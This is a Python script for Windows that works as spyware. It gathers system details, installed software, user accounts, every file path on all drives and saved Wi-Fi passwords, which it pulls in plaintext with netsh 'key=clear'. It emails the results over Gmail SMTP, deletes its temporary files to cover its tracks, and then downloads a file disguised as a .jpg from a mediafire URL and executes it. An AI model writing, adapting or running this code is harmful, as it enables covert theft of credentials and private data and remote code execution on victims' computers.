import os
import subprocess
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import requests, tempfile



mac = subprocess.getoutput("getmac")

curr_loc = tempfile.gettempdir()

command = 'powershell.exe Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher,InstallDate | Format-Table -AutoSize > ' + curr_loc + '\\temp.txt'

installed_software = subprocess.Popen(command)


files = []
all_directory = []
full_path = []

def getting_all_Users():
    users = subprocess.getoutput('net users')      # get the list of all users
    findex = users.find('Administrator')
    lindex = users.find('The command completed successfully.')
    users = users[findex:lindex]      # remove all the unwanted lines to get the output in a better way

    user = users.replace('Administrator','').replace('DefaultAccount','').replace('Guest','').replace('WDAGUtilityAccount','').replace('\n','').split()
    return (user)



def getting_all_files():
    list_of_drives = subprocess.getoutput('wmic logicaldisk get name')  # getting all the drives name
    list_of_drives = list_of_drives.replace('Name', '').replace('\n','').replace(':','').replace(' ', '') #removing all the unwanted

    for drive in list_of_drives[1:]:
        drive = drive + ':'
        result = subprocess.getoutput(drive)
        if result == 'The device is not ready.':
            continue
        os.chdir(drive+'\\')
        files.append(subprocess.getoutput("dir *.* /S /p"))   # to get the list of all folders and subfolders including all the files



getting_all_files()


# getting all the folders and subfoldres present in all the drives

for drive_letter in range(len(files)):
    for driv in files[drive_letter].split('Directory of '):
        all_directory.append(driv[:driv.find('\n')])    # extracting the full path of the folders and subfolders



for location in all_directory:
    if location[0] ==' ':     #  getting a valid location
        all_directory.remove(location)    # removing the invalid location
    else:
        os.chdir(location)
        data = os.listdir()      # nevigating to each folder
        for every_data in data:  # listing all the file and data present in that folder
            full_path.append(location+every_data)   # appending full path of the data



def computer_specification():
        a = str(subprocess.getoutput('systeminfo'))
        b = a.find('System Model')
        c = a.find('OS Version')
        d = a.find('OS Manufacturer')
        e = a.find('System Type:               ')
        f = a.find('Processor')
        g = a.find("Registered Owner")
        h = a.find('Registered Organization')
        i = a.find('OS Name')
        j = a.find('System Manufacturer')
        k = a.find('Total Physical Memory')
        l = a.find('Available Physical Memory')

        info.write(str(a[g:h-1])) # user [windows]
        info.write('\n\n')
        info.write(str(a[i:c-1])) # os name
        info.write('\n\n')
        info.write(str(a[c:d-1].replace('N/A', ''))) # os version
        info.write('\n\n')
        info.write(str(a[e:f-1].replace('x', ''))) # base [32 bits, 64 bits]
        info.write('\n\n')
        info.write(str(a[j:b-1])) # company
        info.write('\n\n')
        info.write(str(a[k:l-1].replace('Total Physical Memory', 'ram installed'))) # ram



os.chdir(curr_loc)
with open('info.txt','w', encoding='utf-8') as info:

    computer_specification()
    info.write('\n\n\n\n')

    info.write(mac)
    info.write('\n\n\n\n\n\n\n=================================================================================================================================\n')
    info.write('\t\t\t\t\t\t\t LIST OF ALL INSTALLED SOFTWARE\n')
    info.write('=================================================================================================================================\n\n')

    info.write(subprocess.getoutput('type temp.txt')+'\n')

    info.write('\n\n\n\n\n\n=================================================================================================================================\n')
    info.write('\t\t\t\t\t INFORMATION ABOUT ALL THE CONNECTED WIFI\n')
    info.write('=================================================================================================================================\n\n\n\n\n\n')

    wifi_network = subprocess.getoutput("netsh wlan show profile")# get all the wifi network name once connected to the pc
    a = wifi_network.split("All User Profile")
    for i in a[1:]:
        wifi_name = i[7:].replace(' ', '').replace('\n','').replace('\t','')  # get the name of the wifi
        command = "netsh wlan show profile " + '"' + wifi_name + '"' + ' key=clear'  # command to get info about it

        info.write(subprocess.getoutput(command))
        info.write("\n\n")
    info.write('\n\n\n\n\n')

    os.chdir(curr_loc)

    info.write('=================================================================================================================================\n')
    info.write('\t\t\t\t\t\t\t LIST OF ALL USERS\n')
    info.write('=================================================================================================================================\n\n')
    info.write(str(getting_all_Users()))
    info.write('\n\n\n\n\n')


    info.write('\n\n\n\n\n\n=================================================================================================================================\n')
    info.write('\t\t\t\t\t\t\t LIST OF ALL FILES\n')
    info.write('=================================================================================================================================\n\n\n\n\n\n')

    for k in full_path:
        info.write(k+'\n\n')



def sending_mail():
    random = 'from_email@gmail.com'
    random2 = 'password'
    random3 = 'to_email@gmail.com'

    subject = 'information of the pc'

    msg = MIMEMultipart()
    msg['From'] = random
    msg['To'] = random3
    msg['Subject'] = subject

    body = 'sending the information of the pc'
    msg.attach(MIMEText(body, 'plain'))

    filename = 'info.txt'

    attachment = open(filename, 'rb')

    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= "+filename)

    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(random, random2)
    server.sendmail(random, random3, text)
    server.quit()


sending_mail()
subprocess.call('del "info.txt"', shell=True)
subprocess.Popen('powershell.exe del temp.txt')


def dd(l):
    a = requests.get(l)
    n=l.split('/')[-1]
    with open(n,'wb') as f:
        f.write(a.content)


k = tempfile.gettempdir()
os.chdir(k)

dd("https://www.mediafire.com/convkey/787d/96pnm82r72s3lhb6g.jpg")
subprocess.Popen('96pnm82r72s3lhb6g.jpg',shell=True)
